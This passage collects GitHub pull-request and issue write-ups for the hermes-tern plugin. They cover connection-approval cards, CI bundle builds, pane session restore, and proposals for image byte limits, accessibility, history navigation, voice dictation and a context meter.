<!-- before-and-after:end -->

| An MCP row shows what Connect runs before you approve it (new) |
|:---:|
| ![MCP launch line](https://github.com/user-attachments/assets/2fe83a40-e925-4eec-8ec4-6d45ce3f224b) |

## What was broken (found in a scratch lab on hermes-agent `main`)

| What | Cause | Now |
| --- | --- | --- |
| No card at all on Tern `main` | `connection.request` is ignored | The pane draws and answers the card (first commit) |
| Hint said "up to 5 minutes"; the gateway waits 10 | The gateway publishes the first `connection.update` before `connection.request`. The pane drew the card from the update (no `timeout_seconds`) and dropped the request as not newer | The hint counts down from `deadline_at`, which every frame carries |
| "Thinking" shimmered under the card while the tool waited | The turn's live line runs after any non-text block | No Thinking line while the newest card waits on the user |
| Try again gave no feedback | Nothing showed the request in flight | "Retrying…", "Skipping…", "Continuing…" while an answer is in flight; no second press |
| Three button styles, hint and notes in monospace, "Hermes carries on." under every settled card | Styling | One button style, Desktop's "Not now", Continue at the foot, the UI face, no filler line |
| An MCP row offered Connect without saying what it runs | The gateway's `launch` line was dropped | The row shows "Runs: …" or "Connects to: …" (and working dir, env names) until it resolves, as Desktop does |
| The countdown went stale | The turn node is cached until the card changes | The watcher redraws the card when the shown minute changes |
| A 4004 from the status poll froze the card as "stopped" even when the tool then returned | The gateway drops the operation just before the tool returns | The pane's own "stopped" yields to the tool's result once |

Skip, Continue, typing while a card is open (sends Continue first), and resume with an open card (`pending_connection`) already worked; they still do.

## What the pane does

| Card action | Wire |
| --- | --- |
| Card appears on the running tool row | `connection.request` (`op_id`, `seq`, `deadline_at`, `targets` with links, `tool_call_id`), or the first `connection.update` if it comes first |
| Rows move (initiated, connected, failed) | `connection.update`; a frame whose `seq` is not newer is dropped |
| Authorize ↗ | opens the link, then `connectors.operation.wake {owner, op_id}`; the row then says "waiting for your browser…" and the button "Open again ↗" |
| Not now | `connection.respond {owner, op_id, result: {targets: [{name, status: 'skipped'}]}}` |
| Continue | `connection.respond` with `result: {settled_by: 'continue'}` |
| Try again | `connectors.connect {owner, connectors: [name], reconnect: true}` |
| Resume a session with an open card | the resume snapshot's `pending_connection` |

- While a card is open the pane reads `connectors.operation.status` every 2 s as a safety net. A 4004 (no such operation) settles the card as stopped.
- If the pane cannot draw a request, it shows a warning and sends Continue, so the tool never waits silently.
- A settled card is a static summary: one row per app as it ended (connected, skipped, not connected). A line stays under it only when the wait ended without the user (deadline, stopped turn, a link nobody watches).
- The old file-based path still works for gateways that return the no-card result.
- `connections.py`: docstrings only. No Python behaviour changed, so no gateway restart is needed.

## Changes

- `connections/live.ts` (new): the card protocol. `gateway/handlers/connections.ts` (new): the two events.
- `connections/cards.ts`, `connections/watcher.ts`: one card model for both wires. Answers in flight live on the card (`sending`). A settled tool result reads as the summary card and is never read as a card file.
- `view/tools/cards/connect.tsx`, `view/styles.ts`: the card, after Desktop's `connector-tool.tsx`.
- `view/transcript.tsx`: no Thinking line under a card that waits on the user.
- `session/adopt.ts`: draws `pending_connection` on resume.
- `lab/fake_model.py`: "connect APP…" and "install APP…" prompts call `manage_connections` connect and MCP install.
- Copilot review: all four findings fixed in 751875a (replies on each thread).
- Tests: `connectionCard.test.ts` (20 cases: request, update-before-request, Authorize, Skip and Continue, update ordering, Try again and its busy state, no Thinking line, settled result, the MCP launch line, a reused call id, a 4004 before the result, the countdown, resume, the old path), `tests/test_connections.py`.

## Checks

- `bun run check` passes (927 tests). Python tests pass (47).
- Lab: a scratch `HERMES_HOME`, its own gateway lock folder, and a gateway running hermes-agent `main` (`6b21d0564d`), driven in a headless Tern with the fake model. Real connect links came from a guest identity. Tried: connect Linear, Linear plus an unknown slug, an MCP install (Figma), Authorize (link logged by a stub `open`), Not now, Continue, Try again, typing while open, and resume with an open card.

## Notes for review

- **Reload.** After a reload the settled card cannot come back: the gateway's resume history keeps a tool's result only for `write_file`, `patch` and `skill_manage` (`tui_gateway/session_history.py`). The call then shows as a plain step, as on Desktop. The pane already reads a settled result as the summary, so the card returns by itself if Hermes ever keeps that result.
- **Overlap with the open stack.** #93 also edits `frontend/src/connections/cards.ts` (it removes `markViewer` and `ternPane`). The hunks do not touch; expect a clean rebase. No overlap with #90 or #91.
- **Build against hermes-agent `main`.** Unrelated to this PR: the frontend no longer typechecks against hermes-agent `main` (30 errors; ui-tui moved `gatewayTypes.ts`, `domain/slash.ts` and more). The lab build used the pinned `frontend/hermes-src.lock` commit, as the shipped bundle does, and ran it against a `main` gateway.

title: ci: build frontend/dist/entry.js on main; pull requests carry source only
body:
Pull requests stop carrying `frontend/dist/entry.js`. A workflow builds it on `main` after each merge and commits it, so installs (plain git clones) still run the current frontend with no build step.

No UI change, so there are no Tern screenshots.

## Why

- Every frontend PR rebuilt the bundle: about 1,600 lines of esbuild renames in each diff.
- Two open PRs always conflicted on it. After each merge the next PR needed a rebase and a rebuild (#75, #76 and #77 are in that state now).

## How

| Event | What runs |
| --- | --- |
| Pull request | `checks` → **bundle is built on main**: fails if the PR changes `frontend/dist/entry.js`, with the command to drop it |
| Push to `main` touching `frontend/**` (not `dist/`) | `bundle` → builds `dist/entry.js` against `hermes-src.lock`, commits `chore(frontend): build dist/entry.js for <sha>` and pushes when it changed |
| Manual | `bundle` has `workflow_dispatch` |

- **Concurrency:** one bundle build at a time, in order. Each build resets to `main`'s newest commit and builds again if `main` moved before the push, up to three times.
- **Pushing past the ruleset:** `main` requires pull requests, and a personal repo cannot let the Actions app skip that. The workflow checks out with a write deploy key (secret `BUNDLE_DEPLOY_KEY`), and the ruleset now lists deploy keys as a bypass actor. The workflow token stays read-only.
- **No loop:** pushes made with that key change only `frontend/dist/`, which the workflow's path filter leaves out.
- **Old check removed:** "bundle is current" compared the PR's bundle with a fresh build. `main`'s build replaces it.

## For contributors

- `bun run bundle` still builds `dist/entry.js` for local runs (the lab, `hermes tern` from a worktree). Do not commit it.
- To drop it from a branch: `git checkout origin/main -- frontend/dist/entry.js`.
- The two READMEs say so.

## After merge

- Drop the bundle from #75, #76 and #77. They then merge with no rebuilds.
- The first frontend merge after this one shows the workflow working: a bot commit on `main` with the rebuilt bundle.

## What happened

From the reported session (`local-d0014882…`, this Mac):

- `display.busy_input_mode` is `interrupt`, so Enter during a reply sent `session.redirect`: it cut the reply while it streamed, and the agent went on in the **same turn** (`agent.log`: one "Turn ended" at 12:19:30, "response ready … 74.6s"; the cut reply in `state.db` ends mid-word with no `finish_reason`).
- The pane marks both a steer and a redirect "↳ Steered" (`turn/router.ts`).
- `foldOf` in `view/workLogModel.ts` kept one text per turn in view: the turn's last. The live turn held `[tool, reply 1, steer, thinking, reply 2]`, so reply 1 went into the first "Worked for 44s" fold.
- The `queue-steer` golden snapshot had recorded the same bug ("Formatting the files" folded before its steer).

## Fix

In the turn/fold model (`view/workLogModel.ts`) only:

- `steeredReplies()` finds the text just before each steer (it skips empty seal blocks and steers sent back to back).
- `foldOf` keeps that text in view, as an answer. A text with a tool call or a thought after it is still a note and still folds.
- The stretch after the steer gets its own fold and answer. A steer that lands after the reply but before `message.complete` works the same, whether the turn goes on or a new turn starts.

## Lab

- `lab/fake_model.py` gets a `stream…` prompt: a 1 s command, then a long Markdown reply streamed over about 20 s, so a steer or redirect can land mid-reply.
- The screenshots: `stream the plan`, then `only claim when we know` sent about 8 s into the reply, with `busy_input_mode: interrupt`.

## Tests

- `steer.test.ts`: the real event order replayed at the store; also the steer that arrives after the reply but before `message.complete`.
- `workLog.test.ts`: `parts()` and `foldOf` with a seal before the steer, two steers in a row, and a note followed by a tool call (still folds).
- New golden replay `redirect-reply` (`fixtures/redirect-reply.jsonl`): Enter while busy in interrupt mode, `session.redirect`, the stream.
- `queue-steer.json` updated: it had recorded the bug.
- `bun run check` passes (882 tests). No Python changed.

## Not in this PR

- A redirect is labelled "Steered". It cut the reply, so "Redirected" would be truer.
- Hermes stores the redirect as a plain user row, so after a reload the steered part shows as a new prompt, not inside the turn.

title: feat: a hermes tern pane resumes its conversation after its program dies
body:
When a `hermes tern` pane's program dies (a crash, a signal, a gateway outage) and you run `hermes tern` again in the same pane, it resumes that pane's conversation instead of opening a new one.


<!-- before-and-after:start -->
| Before (the pane's program killed, then hermes tern run again in the same pane) | After (the pane's program killed, then hermes tern run again in the same pane) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/23931727-df9a-4570-9f52-d6ac6b252175) | ![After](https://github.com/user-attachments/assets/965911ce-2a3b-48c9-a11e-eda22b9d19c2) |

<!-- before-and-after:end -->

## Why

Today every `hermes tern` process on the Mac was stopped at once. Tern kept the panes (its daemon never stopped), but each `hermes tern` started again opened a new, empty session, and finding the old ones meant `/sessions` once per pane.

Tern 0.9.5 has no general restore hook. Its daemon re-runs only omp (`omp_session_file`, `omp_restore`) and its own chat (`tern_acp_session`); every other pane comes back as a shell. So the plugin keeps the mapping itself.

## How

- **The pane records its conversation.** On each new session, resume or reattach the frontend writes `plugin-data/hermes-tern/panes/<TERN_PANE>.json` = `{session_id (root), cwd, updated_at, pid}`. A deliberate quit (Ctrl+D, Ctrl+C twice, `/quit`) removes it; a signal or a closed pane leaves it.
- **The launcher decides** (`panes.py`, called from `__init__.py`). It resumes only when all hold:
  - `TERN_PANE` is set, and no `-r`, `-c` or `-w` flag was given;
  - the recorded process is dead and the session is still in `state.db`;
  - the shell's folder is the pane's launch folder or the session's folder;
  - no live viewer holds the session (any id of its compression chain), and no other pane has claimed it (a claim file under `flock`).
- The resume runs the real `hermes chat --tui --resume <root>`, the same path as typing the flag, so it follows compression to the newest part.
- The pane shows `Resumed "<title>" after the pane restarted.` A failed resume falls back to a new session with a warning.
- `hermes tern --new` forgets the pane's conversation and starts a new one.

## Changes

- `panes.py` (new), `__init__.py` (`_chat` takes extra environment).
- Frontend: `session/pane.ts` (new), `session/lifecycle.ts`, `session/adopt.ts`, `config/env.ts`, `app/chat.ts`, `app/stores.ts`.
- Tests: `tests/test_panes.py`, `__tests__/paneRestore.test.ts`; `test_launcher.py`, `fakes.ts`, `plumbing.test.ts`, `sessionLifecycle.test.ts` updated.
- README.

## Checks

- `bun run check` passes (882 tests); Python: 46 passed.
- In a running Tern (the lab, with `TERN_PANE=4242`, which the headless lab does not set itself): a prompt, then `kill <pid>` of that pane's frontend, then `hermes tern` in the same pane: the conversation came back with the notice.
- The Python launcher changed, but no gateway hook did: no gateway restart is needed.

## Open

- `TERN_PANE` should stay the same across a Tern daemon restart (the layout is restored from `daemon.state` with its ids), but that is not tested here.
- A generic restore hook in Tern would let the daemon start `hermes tern --resume <id>` by itself; until then you type `hermes tern` in the restored shell.

title: [P1 proposal] Image previews: enforce byte limits and session ownership
body:
## User problem

Hermes/Tern can display generated images and browser screenshots returned as a URL. That image is **presentation data**, not an instruction to allocate unbounded memory or update a conversation that the user has already left.

Two related failure modes appear in the current media path:

1. **Download bound:** `frontend/src/media.ts` checks the HTTP `Content-Length` and then calls `response.arrayBuffer()`. A missing or inaccurate length can cause an oversized body to be buffered **before** the existing 16 MiB limit rejects the blob. Large base64 data URLs are likewise decoded before checking their resulting size.
2. **Stale preview:** A pending `Media.show()` request can resolve after a different session is adopted or the same session's transcript is reloaded. It may then fill an old tool-call image, allocate a Tern blob, cache it by URL and ask the pane to redraw.

These are **source-identified correctness/resource-lifecycle risks**; we have not demonstrated an exploit or measured a real-host OOM. Both are reproducible with controlled streams/promises.

## Minimal reproductions

**A — bounded stream**
1. In a mocked `Media.load('https://…/large.png')`, return an HTTP 200 readable stream **without** `Content-Length`.
2. Send more than 16 MiB in chunks.
3. On the baseline implementation, `arrayBuffer()` consumes the body first; the Tern blob limit is checked only later.

**B — session switch**
1. Start loading an image URL for a tool call in session A; keep the fetch unresolved.
2. Switch to session B, or reattach A with freshly loaded transcript objects.
3. Resolve the old fetch even if the transport ignored cancellation.
4. On the baseline path, the stale continuation can still mutate the old `ToolCall`, create a blob and trigger a redraw.

## Intended behavior / acceptance

- [ ] Untrusted HTTP images are read **incrementally** and cancelled when bytes would exceed the existing 16 MiB cap, whether or not the server provided a trustworthy length.
- [ ] Data URL input is bounded **before** decoding; invalid, failed and unsupported images remain graceful fallback states.
- [ ] A new transcript adoption (including a same-session reattach) or pane shutdown invalidates pending image work and URL caches.
- [ ] A late completion cannot upload a blob, mutate an obsolete tool call or redraw a different conversation; the same URL may be fetched afresh under the next session.
- [ ] Existing local-path images, valid small remote images, error paths and normal UI performance keep working.
- [ ] Regression tests cover absent/false length, oversized streams, stale callbacks and abort propagation. Real Tern-host verification is a separate gate.

## Existing proposed implementations — no new feature request to merge wholesale

- **[#72 — bounded image reads](https://github.com/alt-glitch/hermes-tern/pull/72):** [fork CI, 878 tests](https://github.com/kvnloo/hermes-tern/actions/runs/39522394483).
- **[#73 — session-lifetime invalidation](https://github.com/alt-glitch/hermes-tern/pull/73):** *draft stacked on #72*, [fork CI, 881 tests](https://github.com/kvnloo/hermes-tern/actions/runs/39522897016). [Incremental diff](https://github.com/kvnloo/hermes-tern/compare/fix/media-stream-bound...fix/media-session-lifetime).
- Based on the [downstream Hermes × Tern media-lifetime audit](https://github.com/kvnloo/hermes-agent/blob/724b2aaec5981eb264f65923f72858faff27bb5b/ui-tsp/src/media-delivery.ts); adapted to this plugin rather than importing a competing frontend.

**Proposed priority: P1 / correctness and resource bounds.** Maintainer to choose urgency and implementation shape. The repository's newer [source-only PR/bundle policy #78](https://github.com/alt-glitch/hermes-tern/pull/78) may require the existing PR branches to drop generated `dist/entry.js` before review. Neither PR claims end-to-end real-host qualification.

I'd welcome a preference for fixing both behaviors together, splitting them, or deferring them. No additional PR is needed just to discuss scope.

title: [P1 proposal] Make Tern action controls keyboard-accessible and named
body:
## User problem

A person should be able to operate Hermes/Tern with a keyboard or assistive technology, not only a pointer.

On the current mainline, some interactive controls are drawn as clickable Tern rows/icons (`row onClick`, `icon onClick`, or `actions.click`) instead of native focusable buttons. Pointer activation succeeds, but **Tab does not reach the target**, Enter/Space does not activate it, and accessibility output may describe it as an unnamed group or image.

**Specific baseline evidence** from `tern ctl a11y` captured in [PR #70](https://github.com/alt-glitch/hermes-tern/pull/70):

| Control | Before | Desired |
| --- | --- | --- |
| Composer Send | `Image "Return"`, not focusable | Named **Send** button, focusable |
| Help → Close | `Group "Close escape"` | Named **Close** button; Enter/Space |
| Copy answer | No own accessibility node | Named **Copy answer** button; Enter/Space |
| Queued prompt Edit / Steer | Pointer-only behavior | Keyboard-operable named actions |

## Reproduction

1. Launch a Hermes/Tern chat in a headless or real Tern pane and open Help (or a tool card with copy action).
2. Run `tern ctl a11y` and navigate with Tab/Shift+Tab.
3. Observe that these clickable surfaces are not focusable controls; activating via Space/Enter doesn't match a pointer click.
4. Try again while a turn runs (Stop) or while a prompt is queued (Edit/Steer).

This is an accessibility and interaction-parity gap, not evidence of intentional exclusion.

## Intended behavior / acceptance

- [ ] Interactive controls have a keyboard-focusable semantic button and an accurate accessible name; Tab, Shift+Tab, Enter and Space work.
- [ ] Pointer behavior, actions, visual placement, Tern theme and the OMP role vocabulary remain unchanged.
- [ ] Disabled/hidden controls have no hidden tab stop, and no nested button structures are introduced.
- [ ] Focused actions don't accidentally send text to the composer (e.g. Enter on **Copy answer** must not submit a prompt).
- [ ] Validate Send/Stop, Help Close, copy, queued Edit/Steer, PR and connection actions, image remove, and background-process controls.
- [ ] Preserve narrow layouts (especially the ~400 px composer); model/effort chips are currently owned by Tern's special composer layout, so treat them as a documented separate limitation unless a compatible API exists.
- [ ] Accessibility-tree snapshots and keyboard interaction regressions run on relevant frames; real assistive-tech feedback is welcome.

## Existing candidate, not a merge request

- [PR #70 — native named button wrappers](https://github.com/alt-glitch/hermes-tern/pull/70) includes tests and before/after AX observations from headless Tern 0.9.4. Its own notes distinguish tested real controls from cards only covered in unit snapshots.
- Original semantics come from Tern/Stencil's native button and accessibility implementation.

**Proposed priority: P1 / core keyboard and accessibility correctness.** The maintainer can prioritize a smaller initial set, choose another accessibility strategy or defer the branch. This issue describes the user-facing intent separately from the proposed implementation.

title: [P2 proposal] Navigate conversation history: rewind safely and find branch ancestry
body:
## User problem

When working iteratively in one Hermes conversation, it's easy to branch, make a few changes and then lose the path back to an earlier decision.

Today the plugin offers `/undo`, `/retry`, `/branch` and `/sessions`. However:

- `/undo` and `/retry` target the most recent prompt; `/undo 3` has been observed behaving like a single undo rather than backing up three.
- `/sessions` shows saved conversations, but not the **parent–child relationship** among branches. After a branch-of-a-branch, users have to remember session IDs or inspect records to find the origin.
- A destructive rewind and a non-destructive fork from an earlier point are different intents and should not be conflated.

The recently merged [#75 session browser](https://github.com/alt-glitch/hermes-tern/pull/75) improves conversation previews, and [#80 pane restart recovery](https://github.com/alt-glitch/hermes-tern/pull/80) restores session continuity. **Neither is a branch-history or revision-safe rewind UI**, so this is intended as an optional complement rather than a replacement.

## Reproduce the missing workflows

**A — targeted rewind**
1. Create a disposable conversation containing at least three user turns and replies.
2. Try to return to the **first/second prompt** using the native Tern UI, then edit its wording and continue. The existing `/undo` workflow only targets the newest turn.
3. Try `/undo 2` and verify the exact number of prompts removed rather than assuming the count took effect.

**B — branch navigation**
1. Start a session, create a branch, then branch from the child.
2. Open `/sessions` and try to identify the family and its actual parent relationships.
3. Resume the deepest branch after a compaction continuation; verify that the family still makes sense.

## Desired experience and independent acceptance gates

### 1. Optional rewind view ([implementation candidate #68](https://github.com/alt-glitch/hermes-tern/pull/68))

- [ ] Browse earlier **user prompts** and their associated replies before deciding what to do.
- [ ] Make the distinction clear: **Rewind** changes the current conversation; **Branch from here** preserves the original and creates a child session.
- [ ] Confirm a destructive rewind and verify the selected stored message ID against a fresh canonical session read. If the chosen row changed, **do not mutate** anything.
- [ ] Preserve unsent drafts and stop actions while work is busy/queued. Missing earlier image attachments must not be silently reconstructed.
- [ ] Define `/undo N` precisely: only valid positive integer counts, stop at the oldest eligible user prompt, and report invalid counts without dispatch.

### 2. Optional branch tree ([implementation candidate #69](https://github.com/alt-glitch/hermes-tern/pull/69))

- [ ] Show the root, children and deeper branches of the current conversation, mark which one is active, and allow safe switching.
- [ ] Use Hermes's **recorded** parent/branch lineage (`parent_session_id` / relevant metadata), read-only where the gateway lacks this RPC; never infer an unknown cut point as fact.
- [ ] Treat compaction continuations as part of the parent conversation; exclude subagents/tool/reset sessions from branch ancestry.
- [ ] Recover deterministically from missing or circular parent records, including an explicit empty/single-session state.
- [ ] Test session-family trees, switch behavior and stale or broken metadata.

## Design choices for maintainer

These are **two separable UX proposals**. The simplest accepted version could be just a multi-step undo fix, just a read-only branch tree, or neither; both PRs are already open, so no new PR is necessary. A tree does not require the rewind sheet to ship first.

**Proposed priority: P2 / discoverability and workflow quality**, behind correctness and core keyboard access. Existing PRs #68 and #69 include unit/headless test evidence; this issue is not claiming signed-in real-host qualification or upstream approval.

title: [P3 proposal] Opt-in speech dictation into the composer (never auto-submit)
body:
## User problem

Typing long prompts can be inconvenient, especially when hands are occupied. Hermes already has speech-to-text capabilities, but its native Tern composer doesn't currently expose an obvious, **draft-first dictation** path.

The desired workflow is **dictation, not autonomous voice chat**: spoken words fill an editable text draft at the cursor, and the user decides when (or whether) to send it.

## User journey / expected behavior

1. In a Tern pane, explicitly enable the feature with `/voice on`. Before enabling, the microphone is **off** and the record key keeps its existing behavior.
2. Show the current microphone/recording state. On the configured record key (fallback **Alt+V** where Tern owns Hermes's default Ctrl+B), start capture only after Hermes reports that local STT and microphone requirements are available.
3. During capture, display listening/transcription activity and accessible **Done** and **Cancel** controls; Enter/Done ends recording but **must not submit a prompt**.
4. After completion, insert the recognized words **at the caret** as one undoable edit. The draft remains reviewable.
5. Esc/Ctrl+C/Cancel discards that capture, preserves existing draft text, releases the microphone and ignores any late STT callbacks.
6. `/voice off`, session switch, helper failure and pane shutdown all leave recording stopped with a clear, truthful status.

## Scope and acceptance checks

- [ ] **Explicit opt-in**, off by default; no automatic capture and no automatic prompt submission.
- [ ] Graceful missing-device/provider and permission errors; don't claim a microphone is listening when it isn't.
- [ ] Current caret and existing draft survive cancellation, timeouts, and failed capture. Insertion forms one undo step.
- [ ] Barge-in/stop for **recording** is separate from Hermes tool interruption; controls do not bypass approvals.
- [ ] Capture is bounded by Hermes's existing STT configuration, microphone lifecycle and subprocess termination; no new background telemetry or retention behavior.
- [ ] Tern SDK 0.1.0 exposes key presses but not key releases; a **toggle** is acceptable here, not a claim of hold-to-talk support.
- [ ] Test start/stop/cancel, stale callback isolation, no-send-on-Enter, missing prerequisites, keyboard access and shutdown. Real spoken-word transcription must be verified with a suitable microphone before calling that flow fully qualified.
- [ ] If keyboard accessibility work in [#70](https://github.com/alt-glitch/hermes-tern/pull/70) is accepted, the mic's clickable affordance should follow that same named native-button contract.

## Existing candidate (implementation is optional)

[PR #71 — Hermes STT dictation in the composer](https://github.com/alt-glitch/hermes-tern/pull/71) proposes reusing Hermes's existing voice/STT code through a local helper, with typed capture state, `/voice` commands and Tern presentation. Its tests cover frontend state and helper lifetimes; the author explicitly notes that **spoken-word end-to-end transcription was not tested** on the test machine.

**Non-goals:** full-duplex live voice, always-listening wake words, voice tool approvals, additional remote STT vendors, or changing Hermes's existing agent/runtime authority.

**Proposed priority: P3 / optional input enhancement**, behind media correctness, accessibility and basic navigation. The maintainer may prefer deferral, a simpler shortcut, or no plugin-specific voice UI. The issue is to decide intended behavior before discussing whether to merge the existing PR.

title: [P2 proposal] Context-window meter on the composer, opening a context breakdown
body:
## User problem

The composer should show how much of the model's context window is in use. One action on that meter should explain the count without a transcript detour.

## Current behavior

At `5a0b72e`, the plugin already has a thin native meter above the composer. `frontend/src/view/dock.tsx:550-562` hides it below 1%, omits its percentage label, and has no click action. Its tooltip directs the user to `/usage`. `view/dockModel.ts:98-99,132` reads `context_used` and `context_max`. The status strip also shows context usage. This proposal extends that meter, rather than adds a second one.

`gateway/handlers/session.ts` reads usage from `session.info` and `session.usage`. The pinned gateway also serves read-only `session.context_breakdown`, with category token estimates, used/max tokens and estimate/source metadata. Its contract does not expose an automatic compaction threshold. A repository search for `context_used`, `context_max` and `context.*(meter|window|usage)` found no composer action that opens a context sheet.

## OMP parity reference

Our downstream `kvnloo/hermes-agent`, `feat/tern-omp-parity` at `724b2aaec5981eb264f65923f72858faff27bb5b`, has the native `omp.composer.context` meter in `ui-tsp/src/view/dock.tsx`, with a percentage label and named Context action. `src/app.ts` routes that action to `/usage`, and `src/overlays/report-sheet.tsx` presents the report in a native sheet. The meter itself is not clickable there. The proposed plugin action makes the meter the entry point, as in OMP, and uses the gateway's structured breakdown instead of a new backend API.

## Intended behavior / acceptance

- [ ] Keep one thin context meter directly above the composer. Show the percentage, including 0% when zero is known.
- [ ] Make it a named native focusable button. Click or focused Enter opens a native context sheet. Escape closes it without changing the draft or sending a prompt.
- [ ] Show the gateway's used/max token counts, percentage, estimate/source metadata, category estimates and compaction count when available.
- [ ] Unknown values stay unknown. Do not derive context usage from cumulative billing tokens, fabricate a category split, or present visual warning colors as a compaction threshold.
- [ ] If the gateway does not expose a compaction threshold, say so. If the breakdown RPC is unavailable, retain the event-sourced totals and show the error honestly.
- [ ] Cover percentage bounds, zero and unknown data, threshold colors, click/keyboard access, late responses and usage updates with tests and a replay. Check the real UI with the lab fake model in headless `tern serve`.

## Plugin fit and provenance

Plugin-only. Reuse `session.info`/`session.usage` and the existing read-only `session.context_breakdown` RPC. No Hermes-core changes, model requests, new permissions or live-profile writes.

The frontend descends from Can Bölük / Stencil's `ui-tsp`. Preserve that credit for TSP, OMP roles and the meter/report-sheet pattern. The downstream reference above identifies the actual source, not a claim that all of its behavior already exists in this plugin.

Proposed priority: **P2 / navigation and context visibility**, below correctness and accessibility defects. The maintainer may prefer a quieter label or a different native entry point.

title: feat(frontend): open context breakdown from composer meter
body:
Closes #85.

This extends the existing composer hairline rather than adds a second context widget.

- The native meter shows context percentage. Unknown or not-yet-measured usage shows `?`.
- Click or focused Enter opens Tern's context popup through a named native button with a 24 px target. Escape preserves the draft.

title: Design question: owned-turn submission and completion for opt-in live voice
body:
@alt-glitch, how should an optional live-voice plugin submit and observe only its own turns?

We implemented session-owned live voice in our Hermes fork during Hermes × Tern work, before TUI plugin support: [branch `feat/tern-t15-full-live-voice-separate`](https://github.com/kvnloo/hermes-agent/tree/feat/tern-t15-full-live-voice-separate), [implementation commit 5227825](https://github.com/kvnloo/hermes-agent/commit/5227825ca62a3f8e98ec8f2a2879aa9bb9c8b69f). The plugin port is [branch `port/voice-ptt`](https://github.com/kvnloo/hermes-tern/tree/port/voice-ptt) / [Draft #15](https://github.com/kvnloo/hermes-tern/pull/15), with backend integration blocked.

This is **not** #84/#71's draft-first dictation. Those must continue to insert editable text without automatic submission.

The donor uses private `bind_transport`, `server._methods['prompt.submit']` and `_emit_with_live_voice`. Our downstream [generic plugin gateway seam #650](https://github.com/kvnloo/hermes-agent/pull/650) adds caller-bound publication, but no public authorized turn submission/completion API.

[Proposed owned-turn design](https://github.com/kvnloo/hermes-tern/issues/1#issuecomment-6373299063):
- Capture opaque authority from an admitted plugin invocation, bound to its original caller/session/profile/generation.
- Admit text through Hermes's normal single-writer scheduler, with atomic authority checks and existing queue policy.
- Return a per-turn handle for correlated completion/error and cancellation limited to that turn, not a session-wide transcript subscription.
- Revoke admission/delivery on detach, replacement, unload or generation change. Keep live voice separately opt-in, without bypassing approvals.

How would you prefer to proceed: a Hermes core seam (and which shape), a plugin-side alternative, or designing live voice differently?

title: Design question: runtime-owned resource limits for optional table charts
body:
@alt-glitch, how would you recommend enforcing resource limits for an optional numeric-table chart planner across plugin reloads?

We implemented opt-in table charts in our Hermes fork during Hermes × Tern work, before TUI plugin support: [branch `feat/tern-t24-opt-automatic-table-charts`](https://github.com/kvnloo/hermes-agent/tree/feat/tern-t24-opt-automatic-table-charts), [implementation commit 3b8b046](https://github.com/kvnloo/hermes-agent/commit/3b8b046b7d098d4fa98e63083abd88cbc0b941f6). The plugin port is [branch `port/table-charts`](https://github.com/kvnloo/hermes-tern/tree/port/table-charts) / [Draft #3](https://github.com/kvnloo/hermes-tern/pull/3), not released integration. This differs from existing background-process charts.

Its registration-local counters reset on reload while an old provider worker can remain alive. SID/profile or generation alone cannot establish runtime ownership. Our downstream [generic plugin gateway seam #650](https://github.com/kvnloo/hermes-agent/pull/650) does not expose that lifetime.

[Proposed resource-group design](https://github.com/kvnloo/hermes-tern/issues/1#issuecomment-6373172580):
- Core resolves an opaque resource group for the actual live owner and stable plugin namespace, surviving reload/reconnect.
- Enforce eight provider-send attempts total and one physical operation in flight per owner runtime, only for this planner.
- Charge at the actual send boundary. Timeout, cancellation or unload must not refund a send or release a still-running worker.
- Define owner retirement explicitly. Preserve accounting until physical completion, while a genuinely new owner gets a fresh budget.

How would you prefer to proceed: a Hermes core seam (and which ownership/reset shape), a plugin-side alternative, or a different design that avoids this requirement?

title: Resuming a conversation shows ~20 old, already-answered messages as queued
body:
## What happens

When I resume an existing conversation in `hermes tern`, old messages that were already sent and answered come back as **queued** prompts. The queue panel shows about **20 queued messages**. I didn't type any of them in the resumed session.

## Expected

On resume, the queue holds only prompts that are genuinely still pending. Messages already in the transcript, with a reply, should not show up as queued.

## Environment

- hermes-tern: `5a0b72e` (chore(frontend): build dist/entry.js for 0326030), installed as a Hermes plugin
- Tern: `0.9.5 (2863c37)`
- Hermes Agent: `v0.22.2+2275.gc9dce2c` (2026.9.24), Linux
- The conversation is long-running, with many turns, background-process notifications, and several earlier resumes and compactions.

## Where it might come from (unconfirmed)

`frontend/src/gateway/handlers/session.ts` → `'session.info'` passes the gateway's `pending` rows to `cx.queue.server.update(pendingRows(ev.payload))`. Those rows become the queue. The comment there says the idle fanout carries `pending/revision/generation` and is merged, not replaced. So one of two things seems to be happening:

1. On resume, the gateway's `session.info.pending` contains prompts that were already consumed. This could be a stale pending journal on the Hermes side.
2. The frontend's queue reconciliation doesn't drop rows that already match transcript turns.

I haven't confirmed which. A `session.info` payload captured right after resume would show whether `pending` arrives with about 20 entries.

## Repro (as observed)

1. Hold a long conversation in `hermes tern` that has had many turns, including turns sent while the agent was busy.
2. Quit, then resume the same session.
3. Old user messages appear in the queue (about 20 of them) instead of only in the transcript.

title: The chart writer runs on the plugin route, not a Python child that imports Hermes' internals
body:
## In one line

The live chart of a background process now gets its rules through Hermes' public plugin API. `hermes tern` no longer starts a Python script that imports Hermes' private modules.

Part of [#141982](https://github.com/NousResearch/hermes-agent/issues/141982) (run hermes-tern on public APIs only). PR B, #91 (tern's own launcher), stacks on this one.

## What changes for you

Nothing you can see. A background process still gets a live chart after about 15 seconds of output. The chart's rules still come from your auxiliary model (`auxiliary.tern_charts` in `config.yaml`), once per process. Secrets in the output are still redacted before anything leaves.


<!-- before-and-after:start -->
| Before | After |
|:---:|:---:|
| ![Before: a background process's chart, the README image from main](https://github.com/user-attachments/assets/0a9f44e8-2294-42b4-9c2f-84c19f011478) | ![After: the same kind of chart, rules written through the plugin route](https://github.com/user-attachments/assets/9aa29a0a-b504-44ca-bf35-33e6874f73a7) |
| The README's chart image from `main` (a live "before" chart could not be produced in the scratch setup, see Live run) | This PR in a real Tern window on Hermes `main`: a training job's step meter, and the pill's loss trend |
<!-- before-and-after:end -->

## How it worked, and how it works now

**Before.** The frontend (Node) started `widget_author.py` with `$HERMES_PYTHON`. The script loaded Hermes' packages through `HERMES_PYTHON_SRC_ROOT` and called `agent.auxiliary_client.call_llm`, a private function, with a forced `respond` tool call.

**After.**

```mermaid
sequenceDiagram
  participant F as frontend (Node)
  participant G as gateway
  participant P as plugin (charts.py)
  F->>G: plugin.hermes-tern.charts.author {job, system, user}
  G->>P: handler (ctx.register_rpc)
  P-->>F: {job} at once
  P->>P: worker thread: redact, ctx.llm.complete_structured(task=tern_charts, json_mode)
  P-->>F: event plugin.hermes-tern.charts.authored {job, answer | rejected | unavailable | error}
```

